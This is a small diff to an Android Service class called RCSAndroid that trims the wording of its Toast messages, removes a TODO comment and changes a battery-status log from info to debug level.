@@ -17,7 +17,6 @@ import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
-// TODO: Auto-generated Javadoc
 /**
  * The Class RCSAndroid.
  */
@@ -49,7 +48,7 @@ public class RCSAndroid extends Service {
 		super.onCreate();
 
 		registerListeners();
-		Toast.makeText(this, "Que - Service Created", Toast.LENGTH_LONG).show();
+		Toast.makeText(this, "- Service Created", Toast.LENGTH_LONG).show();
 
 		Status.setAppContext(getApplicationContext());
 	}
@@ -77,7 +76,7 @@ public class RCSAndroid extends Service {
 				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 				temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
 				voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
-				Log.i("BatteryManager", "level is " + level + "/" + scale
+				Log.d("BatteryManager", "level is " + level + "/" + scale
 						+ ", temp is " + temp + ", voltage is " + voltage);
 			}
 		};
@@ -102,7 +101,7 @@ public class RCSAndroid extends Service {
 	public void onDestroy() {
 		super.onDestroy();
 
-		Toast.makeText(this, "Que - Stopping thread", Toast.LENGTH_LONG).show();
+		Toast.makeText(this, "- Stopping thread", Toast.LENGTH_LONG).show();
 
 		UnregisterListeners();
 
@@ -110,7 +109,7 @@ public class RCSAndroid extends Service {
 		core.Stop();
 		core = null;
 
-		Toast.makeText(this, "Que - Service Destroyed", Toast.LENGTH_LONG)
+		Toast.makeText(this, "- Service Destroyed", Toast.LENGTH_LONG)
 				.show();
 	}
 
